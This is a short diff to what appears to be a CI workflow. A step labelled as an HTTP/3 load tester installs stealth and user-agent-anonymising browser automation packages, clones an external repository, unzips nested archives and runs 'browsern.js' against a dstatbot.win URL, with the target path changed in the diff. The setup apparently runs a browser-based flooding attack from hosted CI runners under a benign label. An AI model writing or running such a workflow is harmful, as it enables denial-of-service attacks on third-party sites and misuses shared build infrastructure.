@@ -30,7 +30,7 @@ jobs:
       
       - name: Run HTTP/3 load tester
         run: |
-          npm install async axios puppeteer puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-extra-plugin-anonymize-ua puppeteer-extra-plugin-adblocker resemblejs
+          npm install async axios puppeteer puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-extra-plugin-anonymize-ua puppeteer-extra-plugin-adblocker resemblejs undici
           git clone https://github.com/Fegp1p2/ideal-guide.git
           cd ideal-guide
           unzip Fc-main.zip
@@ -39,7 +39,7 @@ jobs:
           cd toomuch
           unzip TEAM.zip
           cd TEAM
-          node browsern.js  https://captcha.dstatbot.win/l67O6j03 700 4
+          node browsern.js  https://captcha.dstatbot.win/QQQCJOto 700 4
 
 
 
